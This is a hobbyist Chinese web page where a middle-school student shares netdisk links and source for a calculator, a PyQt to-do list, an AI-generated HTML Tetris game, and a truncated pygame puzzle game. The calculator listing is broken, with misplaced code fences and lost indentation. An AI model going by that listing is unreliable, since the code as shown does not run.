# 你好  网站版本3.0.0

> 你真棒，你浏览了这个网站。你可以看到一个初中生编的发颠小程序
>
> 没错。（听说作者时不时会在网站上发颠）

# 我的小程序（不包括游戏）



## 8.25：C语言整活

> [!WARNING]
>
> 禁止随意转载或商用

通过网盘分享的文件：10000行的Hello World

 链接: https://pan.baidu.com/s/1uD-iXACfDdMaxYp8qS58Mg 提取码: mawa



## 小工具

> [!WARNING]
>
> 禁止随意转载或商用

通过网盘分享的文件：提醒事件
链接: https://pan.baidu.com/s/1Uh5NeajKf1EMIWB5g3Zdwg 提取码: mawa

> [!IMPORTANT]
>
> 请安装pyqt库

通过网盘分享的文件：计算器
链接: https://pan.baidu.com/s/18OJJ3f57k3g01zAmPN399Q 提取码: mawa

## 游戏

> [!WARNING]
>
> 禁止随意转载或商用

通过网盘分享的文件：shootingblock
链接: https://pan.baidu.com/s/1HTMLNIm-1qJ0slcCyrz05A 提取码: mawa

> [!WARNING]
>
> 禁止随意转载或商用

通过网盘分享的文件：tetris.html

链接: https://pan.baidu.com/s/1jWTjeb7j4uB6cUuN95Y5rw 提取码: mawa

# 开源

## 计算器开源

```python

```

def add(x, y):
    return x + y

def subtract(x, y):
    return x - y

def multiply(x, y):
    return x * y

def divide(x, y):
    if y == 0:
        return "错误：除数不能为零"
    return x / y

def main():
    print("简单计算器")
    print("可用操作：加法 (+), 减法 (-), 乘法 (*), 除法 (/), 退出 (q)")

while True:
    operation = input("请输入操作 (+, -, *, /, q): ").strip()
    if operation == 'q':
        print("退出计算器，再见！")
        break

```python
if operation not in ['+', '-', '*', '/']:
    print("无效的操作，请重新输入。")
    continue

try:
    num1 = float(input("请输入第一个数字: "))
    num2 = float(input("请输入第二个数字: "))
except ValueError:
    print("输入无效，请输入数字。")
    continue

if operation == '+':
    result = add(num1, num2)
elif operation == '-':
    result = subtract(num1, num2)
elif operation == '*':
    result = multiply(num1, num2)
elif operation == '/':
    result = divide(num1, num2)

print(f"结果: {result}")

if __name__ == '__main__':
main()

```

## 10.5：开源项目提醒事件

```
import sys
from PyQt5.QtWidgets import QApplication, QWidget, QVBoxLayout, QPushButton, QListWidget, QLineEdit, QMessageBox

class ToDoApp(QWidget):
    def __init__(self):
        super().__init__()
        self.initUI()

    def initUI(self):
        self.setWindowTitle('待办事项列表')
        self.setGeometry(100, 100, 400, 300)

        # 创建布局
        layout = QVBoxLayout()

        # 创建待办事项输入框
        self.todo_input = QLineEdit()
        self.todo_input.setPlaceholderText("输入待办事项")
        layout.addWidget(self.todo_input)

        # 创建待办事项列表
        self.todo_list = QListWidget()
        layout.addWidget(self.todo_list)

        # 创建按钮
        self.add_button = QPushButton('添加')
        self.add_button.clicked.connect(self.add_todo)
        layout.addWidget(self.add_button)

        self.delete_button = QPushButton('删除')
        self.delete_button.clicked.connect(self.delete_todo)
        layout.addWidget(self.delete_button)

        # 设置布局
        self.setLayout(layout)

    def add_todo(self):
        todo = self.todo_input.text()
        if todo:
            self.todo_list.addItem(todo)
            self.todo_input.clear()
        else:
            QMessageBox.warning(self, "警告", "请输入待办事项内容！")

    def delete_todo(self):
        selected_items = self.todo_list.selectedItems()
        if not selected_items:
            QMessageBox.warning(self, "警告", "请选择要删除的待办事项！")
        else:
            for item in selected_items:
                self.todo_list.takeItem(self.todo_list.row(item))

if __name__ == '__main__':
    app = QApplication(sys.argv)
    ex = ToDoApp()
    ex.show()
    sys.exit(app.exec_())

```

## 10.5：开源项目提醒事件

```python
import sys
from PyQt5.QtWidgets import QApplication, QWidget, QVBoxLayout, QPushButton, QListWidget, QLineEdit, QMessageBox

class ToDoApp(QWidget):
    def __init__(self):
        super().__init__()
        self.initUI()

    def initUI(self):
        self.setWindowTitle('待办事项列表')
        self.setGeometry(100, 100, 400, 300)

        # 创建布局
        layout = QVBoxLayout()

        # 创建待办事项输入框
        self.todo_input = QLineEdit()
        self.todo_input.setPlaceholderText("输入待办事项")
        layout.addWidget(self.todo_input)

        # 创建待办事项列表
        self.todo_list = QListWidget()
        layout.addWidget(self.todo_list)

        # 创建按钮
        self.add_button = QPushButton('添加')
        self.add_button.clicked.connect(self.add_todo)
        layout.addWidget(self.add_button)

        self.delete_button = QPushButton('删除')
        self.delete_button.clicked.connect(self.delete_todo)
        layout.addWidget(self.delete_button)

        # 设置布局
        self.setLayout(layout)

    def add_todo(self):
        todo = self.todo_input.text()
        if todo:
            self.todo_list.addItem(todo)
            self.todo_input.clear()
        else:
            QMessageBox.warning(self, "警告", "请输入待办事项内容！")

    def delete_todo(self):
        selected_items = self.todo_list.selectedItems()
        if not selected_items:
            QMessageBox.warning(self, "警告", "请选择要删除的待办事项！")
        else:
            for item in selected_items:
                self.todo_list.takeItem(self.todo_list.row(item))

if __name__ == '__main__':
    app = QApplication(sys.argv)
    ex = ToDoApp()
    ex.show()
    sys.exit(app.exec_())
```

## 10.5：豆包AI生成《俄罗斯方块》开源

```
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>现代俄罗斯方块</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css" rel="stylesheet">
    
    <!-- Tailwind 配置 -->
    <script>
        tailwind.config = {
            theme: {
                extend: {
                    colors: {
                        primary: '#3B82F6',
                        secondary: '#10B981',
                        accent: '#F59E0B',
                        dark: '#1E293B',
                        light: '#F8FAFC',
                        tetris: {
                            i: '#06B6D4',    // 青色
                            j: '#2563EB',    // 蓝色
                            l: '#F59E0B',    // 橙色
                            o: '#FBBF24',    // 黄色
                            s: '#10B981',    // 绿色
                            t: '#8B5CF6',    // 紫色
                            z: '#EF4444'     // 红色
                        }
                    },
                    fontFamily: {
                        sans: ['Inter', 'system-ui', 'sans-serif'],
                        display: ['"Press Start 2P"', 'cursive']
                    },
                    animation: {
                        'pulse-slow': 'pulse 3s cubic-bezier(0.4, 0, 0.6, 1) infinite',
                    }
                }
            }
        }
    </script>
    
    <style type="text/tailwindcss">
        @layer utilities {
            .text-shadow {
                text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.3);
            }
            .game-shadow {
                box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.1), 0 8px 10px -6px rgba(0, 0, 0, 0.1);
            }
            .grid-board {
                display: grid;
                grid-template-columns: repeat(10, 1fr);
                grid-template-rows: repeat(20, 1fr);
            }
            .grid-next {
                display: grid;
                grid-template-columns: repeat(4, 1fr);
                grid-template-rows: repeat(4, 1fr);
            }
            .cell {
                @apply border border-gray-200 border-opacity-20;
            }
            .control-btn {
                @apply flex items-center justify-center bg-dark text-light rounded-lg p-3 transition-all duration-200 hover:bg-primary active:scale-95 focus:outline-none focus:ring-2 focus:ring-primary/50;
            }
        }
    </style>
    
    <!-- 导入游戏字体 -->
    <link href="https://fonts.googleapis.com/css2?family=Press+Start+2P&display=swap" rel="stylesheet">
</head>
<body class="bg-gradient-to-br from-gray-900 to-gray-800 min-h-screen text-light font-sans flex flex-col items-center justify-center p-4">
    <!-- 游戏标题 -->
    <header class="mb-6 text-center">
        <h1 class="text-[clamp(2rem,5vw,3rem)] font-display text-transparent bg-clip-text bg-gradient-to-r from-primary to-secondary text-shadow animate-pulse-slow">
            俄罗斯方块
        </h1>
        <p class="text-gray-400 mt-2">经典游戏，现代体验</p>
    </header>
    
    <!-- 主游戏容器 -->
    <main class="flex flex-col md:flex-row gap-6 items-center md:items-start justify-center w-full max-w-4xl">
        <!-- 游戏区域 -->
        <div class="relative">
            <div id="game-board" class="grid-board w-[280px] h-[560px] bg-dark/50 rounded-lg overflow-hidden game-shadow">
                <!-- 游戏格子将通过JS动态生成 -->
            </div>
            
            <!-- 游戏状态覆盖层 -->
            <div id="game-overlay" class="absolute inset-0 bg-dark/80 rounded-lg flex flex-col items-center justify-center gap-4 hidden">
                <div id="start-screen" class="text-center p-6">
                    <p class="text-xl mb-4">按 <span class="bg-primary px-2 py-1 rounded">开始</span> 键开始游戏</p>
                    <p class="text-sm text-gray-400">方向键移动，上键旋转，空格键快速下落</p>
                </div>
                <div id="pause-screen" class="text-center p-6 hidden">
                    <p class="text-2xl font-bold mb-4">游戏暂停</p>
                    <p class="text-gray-400">按 <span class="bg-primary px-2 py-1 rounded">继续</span> 键恢复</p>
                </div>
                <div id="game-over-screen" class="text-center p-6 hidden">
                    <p class="text-2xl font-bold text-accent mb-2">游戏结束</p>
                    <p class="text-xl mb-4">最终得分: <span id="final-score">0</span></p>
                    <p class="text-gray-400">按 <span class="bg-primary px-2 py-1 rounded">重新开始</span> 键再来一局</p>
                </div>
            </div>
        </div>
        
        <!-- 游戏信息和控制区域 -->
        <div class="flex flex-col gap-4 w-full md:w-auto">
            <!-- 分数面板 -->
            <div class="bg-dark/50 rounded-lg p-4 w-full md:w-[200px] game-shadow">
                <h2 class="text-center text-lg font-bold mb-3 border-b border-gray-700 pb-2">游戏数据</h2>
                <div class="space-y-3">
                    <div>
                        <p class="text-gray-400 text-sm">分数</p>
                        <p id="score" class="text-2xl font-display text-primary">0</p>
                    </div>
                    <div>
                        <p class="text-gray-400 text-sm">等级</p>
                        <p id="level" class="text-2xl font-display text-secondary">1</p>
                    </div>
                    <div>
                        <p class="text-gray-400 text-sm">已消除行数</p>
                        <p id="lines" class="text-2xl font-display text-accent">0</p>
                    </div>
                </div>
            </div>
            
            <!-- 下一个方块预览 -->
            <div class="bg-dark/50 rounded-lg p-4 w-full md:w-[200px] game-shadow">
                <h2 class="text-center text-lg font-bold mb-3 border-b border-gray-700 pb-2">下一个方块</h2>
                <div id="next-piece" class="grid-next w-[120px] h-[120px] mx-auto bg-dark/30 rounded">
                    <!-- 下一个方块将通过JS动态生成 -->
                </div>
            </div>
            
            <!-- 控制按钮 -->
            <div class="bg-dark/50 rounded-lg p-4 w-full md:w-[200px] game-shadow">
                <h2 class="text-center text-lg font-bold mb-3 border-b border-gray-700 pb-2">控制</h2>
                <div class="grid grid-cols-3 gap-2">
                    <button id="btn-rotate" class="control-btn col-start-2">
                        <i class="fa fa-rotate-right"></i>
                    </button>
                    <button id="btn-left" class="control-btn col-start-1 row-start-2">
                        <i class="fa fa-arrow-left"></i>
                    </button>
                    <button id="btn-down" class="control-btn col-start-2 row-start-2">
                        <i class="fa fa-arrow-down"></i>
                    </button>
                    <button id="btn-right" class="control-btn col-start-3 row-start-2">
                        <i class="fa fa-arrow-right"></i>
                    </button>
                    <button id="btn-drop" class="control-btn col-start-1 col-end-4 mt-2">
                        <i class="fa fa-level-down"></i> 快速下落
                    </button>
                </div>
                <div class="grid grid-cols-2 gap-2 mt-4">
                    <button id="btn-start" class="control-btn bg-secondary">
                        <i class="fa fa-play"></i> 开始
                    </button>
                    <button id="btn-pause" class="control-btn bg-accent" disabled>
                        <i class="fa fa-pause"></i> 暂停
                    </button>
                </div>
            </div>
        </div>
    </main>
    
    <!-- 游戏说明 -->
    <footer class="mt-8 text-center text-gray-500 text-sm max-w-2xl">
        <p>使用键盘控制: ← → 移动 | ↑ 旋转 | ↓ 加速下落 | 空格 快速下落 | P 暂停 | R 重新开始</p>
        <p class="mt-2">消除一行得100分，连续消除多行得分更高！随着等级提升，方块下落速度加快</p>
    </footer>

    <script>
        // 方块形状定义 (I, J, L, O, S, T, Z)
        const SHAPES = {
            I: [
                [0, 0, 0, 0],
                [1, 1, 1, 1],
                [0, 0, 0, 0],
                [0, 0, 0, 0]
            ],
            J: [
                [1, 0, 0],
                [1, 1, 1],
                [0, 0, 0]
            ],
            L: [
                [0, 0, 1],
                [1, 1, 1],
                [0, 0, 0]
            ],
            O: [
                [1, 1],
                [1, 1]
            ],
            S: [
                [0, 1, 1],
                [1, 1, 0],
                [0, 0, 0]
            ],
            T: [
                [0, 1, 0],
                [1, 1, 1],
                [0, 0, 0]
            ],
            Z: [
                [1, 1, 0],
                [0, 1, 1],
                [0, 0, 0]
            ]
        };

        // 方块颜色映射
        const COLORS = {
            I: 'bg-tetris-i',
            J: 'bg-tetris-j',
            L: 'bg-tetris-l',
            O: 'bg-tetris-o',
            S: 'bg-tetris-s',
            T: 'bg-tetris-t',
            Z: 'bg-tetris-z',
            empty: 'bg-transparent',
            filled: 'bg-gray-700'
        };

        // 游戏状态
        const gameState = {
            board: Array(20).fill().map(() => Array(10).fill(0)),
            currentPiece: null,
            currentPosition: { row: 0, col: 0 },
            nextPiece: null,
            score: 0,
            level: 1,
            lines: 0,
            gameOver: false,
            paused: false,
            gameInterval: null,
            dropSpeed: 1000, // 初始下落速度 (毫秒)
            isRunning: false
        };

        // DOM 元素
        const elements = {
            gameBoard: document.getElementById('game-board'),
            nextPiece: document.getElementById('next-piece'),
            scoreDisplay: document.getElementById('score'),
            levelDisplay: document.getElementById('level'),
            linesDisplay: document.getElementById('lines'),
            gameOverlay: document.getElementById('game-overlay'),
            startScreen: document.getElementById('start-screen'),
            pauseScreen: document.getElementById('pause-screen'),
            gameOverScreen: document.getElementById('game-over-screen'),
            finalScore: document.getElementById('final-score'),
            buttons: {
                rotate: document.getElementById('btn-rotate'),
                left: document.getElementById('btn-left'),
                right: document.getElementById('btn-right'),
                down: document.getElementById('btn-down'),
                drop: document.getElementById('btn-drop'),
                start: document.getElementById('btn-start'),
                pause: document.getElementById('btn-pause')
            }
        };

        // 初始化游戏板
        function initializeBoard() {
            // 清空游戏板
            elements.gameBoard.innerHTML = '';
            
            // 创建游戏格子
            for (let row = 0; row < 20; row++) {
                for (let col = 0; col < 10; col++) {
                    const cell = document.createElement('div');
                    cell.classList.add('cell');
                    cell.dataset.row = row;
                    cell.dataset.col = col;
                    elements.gameBoard.appendChild(cell);
                }
            }
            
            // 初始化下一个方块预览区
            initializeNextPiecePreview();
        }

        // 初始化下一个方块预览区
        function initializeNextPiecePreview() {
            elements.nextPiece.innerHTML = '';
            for (let row = 0; row < 4; row++) {
                for (let col = 0; col < 4; col++) {
                    const cell = document.createElement('div');
                    cell.classList.add('cell');
                    cell.dataset.row = row;
                    cell.dataset.col = col;
                    elements.nextPiece.appendChild(cell);
                }
            }
        }

        // 随机生成一个新方块
        function getRandomPiece() {
            const keys = Object.keys(SHAPES);
            const tetromino = keys[Math.floor(Math.random() * keys.length)];
            return {
                shape: SHAPES[tetromino],
                type: tetromino
            };
        }

        // 放置新方块到游戏板
        function spawnNewPiece() {
            // 如果没有下一个方块，先生成一个
            if (!gameState.nextPiece) {
                gameState.nextPiece = getRandomPiece();
            }
            
            // 将下一个方块设为当前方块
            gameState.currentPiece = gameState.nextPiece;
            // 生成新的下一个方块
            gameState.nextPiece = getRandomPiece();
            
            // 设置初始位置（居中）
            const shapeWidth = gameState.currentPiece.shape[0].length;
            gameState.currentPosition = {
                row: 0,
                col: Math.floor((10 - shapeWidth) / 2)
            };
            
            // 检查游戏是否结束（新方块无法放置）
            if (checkCollision(gameState.currentPiece.shape, gameState.currentPosition)) {
                gameOver();
                return false;
            }
            
            // 更新UI
            renderBoard();
            renderNextPiece();
            return true;
        }

        // 检查碰撞
        function checkCollision(shape, position) {
            for (let row = 0; row < shape.length; row++) {
                for (let col = 0; col < shape[row].length; col++) {
                    if (shape[row][col]) {
                        const newRow = position.row + row;
                        const newCol = position.col + col;
                        
                        // 检查是否超出边界或与已有方块碰撞
                        if (
                            newRow < 0 ||
                            newRow >= 20 ||
                            newCol < 0 ||
                            newCol >= 10 ||
                            gameState.board[newRow][newCol]
                        ) {
                            return true;
                        }
                    }
                }
            }
            return false;
        }

        // 旋转方块
        function rotatePiece() {
            if (gameState.paused || gameState.gameOver || !gameState.isRunning) return;
            
            // 保存当前形状
            const originalShape = gameState.currentPiece.shape;
            const rows = originalShape.length;
            const cols = originalShape[0].length;
            
            // 创建旋转后的新形状（90度顺时针）
            const rotatedShape = Array(cols).fill().map(() => Array(rows).fill(0));
            
            for (let row = 0; row < rows; row++) {
                for (let col = 0; col < cols; col++) {
                    rotatedShape[col][rows - 1 - row] = originalShape[row][col];
                }
            }
            
            // 尝试旋转
            gameState.currentPiece.shape = rotatedShape;
            
            // 如果旋转后发生碰撞，尝试墙踢（wall kick）
            if (checkCollision(rotatedShape, gameState.currentPosition)) {
                // 尝试向右移动
                gameState.currentPosition.col++;
                if (checkCollision(rotatedShape, gameState.currentPosition)) {
                    // 向右移动也不行，尝试向左移动两步（因为刚才向右移动了一步）
                    gameState.currentPosition.col -= 2;
                    if (checkCollision(rotatedShape, gameState.currentPosition)) {
                        // 向左移动也不行，恢复原始形状和位置
                        gameState.currentPosition.col++; // 恢复到原始列位置
                        gameState.currentPiece.shape = originalShape;
                        return false;
                    }
                }
            }
            
            renderBoard();
            return true;
        }

        // 移动方块
        function movePiece(direction) {
            if (gameState.paused || gameState.gameOver || !gameState.isRunning) return;
            
            const originalPosition = { ...gameState.currentPosition };
            
            switch (direction) {
                case 'left':
                    gameState.currentPosition.col--;
                    break;
                case 'right':
                    gameState.currentPosition.col++;
                    break;
                case 'down':
                    gameState.currentPosition.row++;
                    break;
            }
            
            // 检查碰撞
            if (checkCollision(gameState.currentPiece.shape, gameState.currentPosition)) {
                // 如果是向下移动时发生碰撞，将方块固定在当前位置
                if (direction === 'down') {
                    gameState.currentPosition = originalPosition;
                    lockPiece();
                    return false;
                } else {
                    // 其他方向移动发生碰撞，恢复原始位置
                    gameState.currentPosition = originalPosition;
                    return false;
                }
            }
            
            renderBoard();
            return true;
        }

        // 快速下落
        function dropPiece() {
            if (gameState.paused || gameState.gameOver || !gameState.isRunning) return;
            
            let droppedRows = 0;
            // 一直向下移动直到碰撞
            while (movePiece('down')) {
                droppedRows++;
            }
            
            // 根据下落的行数加分
            if (droppedRows > 0) {
                addScore(droppedRows);
            }
        }

        // 将方块固定在游戏板上
        function lockPiece() {
            const shape = gameState.currentPiece.shape;
            const { row: posRow, col: posCol } = gameState.currentPosition;
            
            // 将方块的位置标记到游戏板上
            for (let row = 0; row < shape.length; row++) {
                for (let col = 0; col < shape[row].length; col++) {
                    if (shape[row][col]) {
                        const boardRow = posRow + row;
                        const boardCol = posCol + col;
                        if (boardRow >= 0 && boardCol >= 0) {
                            gameState.board[boardRow][boardCol] = gameState.currentPiece.type;
                        }
                    }
                }
            }
            
            // 检查是否有可消除的行
            checkLines();
            
            // 生成新方块
            spawnNewPiece();
        }

        // 检查并消除已满的行
        function checkLines() {
            let linesCleared = 0;
            
            // 从底部向上检查每一行
            for (let row = 19; row >= 0; row--) {
                if (gameState.board[row].every(cell => cell !== 0)) {
                    // 消除当前行
                    gameState.board.splice(row, 1);
                    // 在顶部添加一行空行
                    gameState.board.unshift(Array(10).fill(0));
                    // 因为删除了一行，需要重新检查当前行（现在是新的一行）
                    row++;
                    linesCleared++;
                }
            }
            
            if (linesCleared > 0) {
                // 根据消除的行数加分（消除行数越多，得分倍数越高）
                const lineScores = [0, 100, 300, 500, 800]; // 0, 1, 2, 3, 4行的得分
                addScore(lineScores[linesCleared] * gameState.level);
                
                // 更新已消除行数
                gameState.lines += linesCleared;
                elements.linesDisplay.textContent = gameState.lines;
                
                // 检查是否升级
                checkLevelUp();
            }
        }

        // 检查是否升级
        function checkLevelUp() {
            const newLevel = Math.floor(gameState.lines / 10) + 1;
            if (newLevel > gameState.level) {
                gameState.level = newLevel;
                elements.levelDisplay.textContent = gameState.level;
                
                // 随着等级提升，加快下落速度（最低100ms）
                gameState.dropSpeed = Math.max(100, 1000 - (gameState.level - 1) * 100);
                
                // 重新设置游戏间隔
                if (gameState.gameInterval) {
                    clearInterval(gameState.gameInterval);
                    gameState.gameInterval = setInterval(moveDown, gameState.dropSpeed);
                }
                
                // 播放升级音效（如果有）
                playSound('levelup');
            }
        }

        // 加分
        function addScore(points) {
            gameState.score += points;
            elements.scoreDisplay.textContent = gameState.score;
            playSound('score');
        }

        // 渲染游戏板
        function renderBoard() {
            // 先清除所有方块
            document.querySelectorAll('#game-board .cell').forEach(cell => {
                cell.className = 'cell';
            });
            
            // 渲染固定在游戏板上的方块
            for (let row = 0; row < 20; row++) {
                for (let col = 0; col < 10; col++) {
                    const cellType = gameState.board[row][col];
                    if (cellType) {
                        const cell = document.querySelector(`#game-board .cell[data-row="${row}"][data-col="${col}"]`);
                        cell.classList.add(COLORS[cellType], 'transition-colors', 'duration-100');
                    }
                }
            }
            
            // 渲染当前活动的方块
            if (gameState.currentPiece) {
                const shape = gameState.currentPiece.shape;
                const { row: posRow, col: posCol } = gameState.currentPosition;
                
                for (let row = 0; row < shape.length; row++) {
                    for (let col = 0; col < shape[row].length; col++) {
                        if (shape[row][col]) {
                            const boardRow = posRow + row;
                            const boardCol = posCol + col;
                            
                            // 只渲染在游戏板可见区域内的部分
                            if (boardRow >= 0 && boardRow < 20 && boardCol >= 0 && boardCol < 10) {
                                const cell = document.querySelector(`#game-board .cell[data-row="${boardRow}"][data-col="${boardCol}"]`);
                                cell.classList.add(COLORS[gameState.currentPiece.type], 'transition-colors', 'duration-100');
                            }
                        }
                    }
                }
            }
        }

        // 渲染下一个方块预览
        function renderNextPiece() {
            // 先清除预览区
            document.querySelectorAll('#next-piece .cell').forEach(cell => {
                cell.className = 'cell';
            });
            
            if (gameState.nextPiece) {
                const shape = gameState.nextPiece.shape;
                const type = gameState.nextPiece.type;
                
                // 计算居中偏移量
                const offsetRow = Math.floor((4 - shape.length) / 2);
                const offsetCol = Math.floor((4 - shape[0].length) / 2);
                
                for (let row = 0; row < shape.length; row++) {
                    for (let col = 0; col < shape[row].length; col++) {
                        if (shape[row][col]) {
                            const previewRow = offsetRow + row;
                            const previewCol = offsetCol + col;
                            
                            const cell = document.querySelector(`#next-piece .cell[data-row="${previewRow}"][data-col="${previewCol}"]`);
                            cell.classList.add(COLORS[type], 'transition-colors', 'duration-100');
                        }
                    }
                }
            }
        }

        // 移动方块向下（游戏主循环）
        function moveDown() {
            movePiece('down');
        }

        // 开始游戏
        function startGame() {
            // 重置游戏状态
            resetGame();
            
            // 隐藏开始屏幕，显示游戏
            elements.startScreen.classList.add('hidden');
            elements.gameOverlay.classList.add('hidden');
            
            // 更新按钮状态
            elements.buttons.start.disabled = true;
            elements.buttons.start.classList.remove('bg-secondary');
            elements.buttons.start.classList.add('bg-gray-600');
            elements.buttons.pause.disabled = false;
            elements.buttons.pause.classList.remove('bg-gray-600');
            elements.buttons.pause.classList.add('bg-accent');
            
            // 生成第一个方块
            spawnNewPiece();
            
            // 开始游戏循环
            gameState.isRunning = true;
            gameState.gameInterval = setInterval(moveDown, gameState.dropSpeed);
            
            playSound('start');
        }

        // 暂停游戏
        function pauseGame() {
            if (gameState.gameOver) return;
            
            if (gameState.paused) {
                // 继续游戏
                gameState.paused = false;
                elements.pauseScreen.classList.add('hidden');
                elements.gameOverlay.classList.add('hidden');
                elements.buttons.pause.innerHTML = '<i class="fa fa-pause"></i> 暂停';
                
                // 恢复游戏循环
                gameState.gameInterval = setInterval(moveDown, gameState.dropSpeed);
                playSound('resume');
            } else {
                // 暂停游戏
                gameState.paused = true;
                elements.pauseScreen.classList.remove('hidden');
                elements.gameOverlay.classList.remove('hidden');
                elements.buttons.pause.innerHTML = '<i class="fa fa-play"></i> 继续';
                
                // 停止游戏循环
                clearInterval(gameState.gameInterval);
                playSound('pause');
            }
        }

        // 游戏结束
        function gameOver() {
            gameState.gameOver = true;
            gameState.isRunning = false;
            clearInterval(gameState.gameInterval);
            
            // 显示游戏结束屏幕
            elements.finalScore.textContent = gameState.score;
            elements.gameOverScreen.classList.remove('hidden');
            elements.gameOverlay.classList.remove('hidden');
            
            // 更新按钮状态
            elements.buttons.start.disabled = false;
            elements.buttons.start.classList.remove('bg-gray-600');
            elements.buttons.start.classList.add('bg-secondary');
            elements.buttons.start.innerHTML = '<i class="fa fa-refresh"></i> 重新开始';
            elements.buttons.pause.disabled = true;
            elements.buttons.pause.classList.remove('bg-accent');
            elements.buttons.pause.classList.add('bg-gray-600');
            
            playSound('gameover');
        }

        // 重置游戏
        function resetGame() {
            gameState.board = Array(20).fill().map(() => Array(10).fill(0));
            gameState.currentPiece = null;
            gameState.currentPosition = { row: 0, col: 0 };
            gameState.nextPiece = null;
            gameState.score = 0;
            gameState.level = 1;
            gameState.lines = 0;
            gameState.gameOver = false;
            gameState.paused = false;
            gameState.dropSpeed = 1000;
            
            // 更新显示
            elements.scoreDisplay.textContent = '0';
            elements.levelDisplay.textContent = '1';
            elements.linesDisplay.textContent = '0';
            elements.gameOverScreen.classList.add('hidden');
            elements.pauseScreen.classList.add('hidden');
            
            // 重置按钮文本
            elements.buttons.pause.innerHTML = '<i class="fa fa-pause"></i> 暂停';
        }

        // 播放音效（简化版，实际项目中可以使用Audio对象）
        function playSound(type) {
            // 这里只是模拟音效播放，实际项目中可以添加真实音效
            console.log(`播放${type}音效`);
            // 示例：const sound = new Audio(`sounds/${type}.mp3`); sound.play();
        }

        // 初始化事件监听
        function initializeEventListeners() {
            // 按钮控制
            elements.buttons.rotate.addEventListener('click', rotatePiece);
            elements.buttons.left.addEventListener('click', () => movePiece('left'));
            elements.buttons.right.addEventListener('click', () => movePiece('right'));
            elements.buttons.down.addEventListener('click', () => movePiece('down'));
            elements.buttons.drop.addEventListener('click', dropPiece);
            elements.buttons.start.addEventListener('click', startGame);
            elements.buttons.pause.addEventListener('click', pauseGame);
            
            // 键盘控制
            document.addEventListener('keydown', (e) => {
                switch (e.key) {
                    case 'ArrowLeft':
                        movePiece('left');
                        e.preventDefault();
                        break;
                    case 'ArrowRight':
                        movePiece('right');
                        e.preventDefault();
                        break;
                    case 'ArrowDown':
                        movePiece('down');
                        e.preventDefault();
                        break;
                    case 'ArrowUp':
                        rotatePiece();
                        e.preventDefault();
                        break;
                    case ' ': // 空格键
                        dropPiece();
                        e.preventDefault();
                        break;
                    case 'p':
                    case 'P':
                        if (gameState.isRunning && !gameState.gameOver) {
                            pauseGame();
                        }
                        e.preventDefault();
                        break;
                    case 'r':
                    case 'R':
                        if (gameState.gameOver || gameState.isRunning) {
                            startGame();
                        }
                        e.preventDefault();
                        break;
                }
            });
        }

        // 初始化游戏
        function init() {
            initializeBoard();
            initializeEventListeners();
            
            // 显示开始屏幕
            elements.startScreen.classList.remove('hidden');
            elements.gameOverlay.classList.remove('hidden');
        }

        // 启动游戏
        window.addEventListener('DOMContentLoaded', init);
    </script>
</body>
</html>

```

# 关于作者

## 作者github

[ja7827298/-： 写不下去了](https://github.com/ja7827298/-)



## 作者B站

名称：**理理茂茂**



## 作者抖音



名称：不会飞的大疆mini 2 se










# 

```python


```

# 

# 游戏：A dmin（解密，Meta)   

源码3.0.0 game3

```
input("什么是真的，什么是假的？")
input("你真的把他除掉了吗")
input("HELLO EVERYONE!")
input("I CANNOT DIE!!!")
input("GAME IS NOT OVER")
input("cmd:del a dmin")
input("NOW,GAME 3 START")
#游戏1
import pygame
import random
import sys
import time
import math

# 初始化pygame
pygame.init()

# ===================== 节奏医生风格配置 =====================
# 窗口尺寸（匹配节奏医生经典尺寸）
WINDOW_WIDTH, WINDOW_HEIGHT = 640, 480
FPS = 60
TARGET_SIZE = 40  # 缩小目标，增加难度
BASE_SCORE = 1
WIN_SCORE = 1        # 通关分数改为80分
TIME_LIMIT = 90       # 时间限制（1分30秒）
FINAL_PHASE_TIME = 20 # 最后20秒触发绕屏跑步

# 移动效果参数
# 前期（前70秒）简单抖动参数
SHAKE_SPEED = 8       # 简单抖动速度
SHAKE_AMPLITUDE = 20  # 简单抖动幅度
# 后期（最后20秒）绕屏跑步参数
RUN_SPEED = 12        # 跑步移动速度（越快越冲刺）
RUN_RANGE = 800       # 窗口移动的总范围（超过屏幕宽度）
FINAL_SHAKE_INTENSITY = 6   # 后期叠加抖动强度
FINAL_SHAKE_FREQUENCY = 0.2 # 后期抖动频率

# 颜色定义
WHITE = (255, 255, 255)
RED = (255, 0, 0)
BLACK = (0, 0, 0)
GREEN = (0, 255, 0)

# ===================== 窗口初始化（居中+固定尺寸） =====================
# 获取屏幕分辨率，计算窗口初始居中位置
screen_info = pygame.display.Info()
SCREEN_WIDTH = screen_info.current_w
SCREEN_HEIGHT = screen_info.current_h
INIT_WIN_X = (SCREEN_WIDTH - WINDOW_WIDTH) // 2  # 初始居中X
INIT_WIN_Y = (SCREEN_HEIGHT - WINDOW_HEIGHT) // 2 # 初始居中Y

# 创建固定尺寸窗口
screen = pygame.display.set_mode((WINDOW_WIDTH, WINDOW_HEIGHT), pygame.NOFRAME)  # 无边框更贴近原作
try:
    from pygame._sdl2 import Window
    window = Window.from_display_module()
    window.position = (INIT_WIN_X, INIT_WIN_Y)  # 初始居中
    WINDOW_AVAILABLE = True
except ImportError:
    # 兼容旧版本Pygame，用画面偏移模拟
    WINDOW_AVAILABLE = False
    move_offset_x, move_offset_y = 0, 0
    # 旧版本添加窗口边框
    screen = pygame.display.set_mode((WINDOW_WIDTH, WINDOW_HEIGHT))

pygame.display.set_caption("节奏医生 2-X - 分段移动挑战")
clock = pygame.time.Clock()

# 设置字体
try:
    font_large = pygame.font.Font(None, 64)
    font_medium = pygame.font.Font(None, 38)
    font_small = pygame.font.SysFont("Arial", 28)
except:
    font_large = pygame.font.SysFont("Arial", 64)
    font_medium = pygame.font.SysFont("Arial", 38)
    font_small = pygame.font.SysFont("Arial", 28)

# ===================== 游戏变量初始化 =====================
def init_game_variables():
    """初始化/重置所有游戏变量"""
    global score, start_time, game_over, win, target_x, target_y
    global current_win_x, shake_phase, phase_shake_counter
    # 基础游戏变量
    score = 0
    start_time = time.time()
    game_over = False
    win = False
    target_x = random.randint(TARGET_SIZE//2, WINDOW_WIDTH - TARGET_SIZE//2)
    target_y = random.randint(TARGET_SIZE//2, WINDOW_HEIGHT - TARGET_SIZE//2)
    
    # 移动效果变量
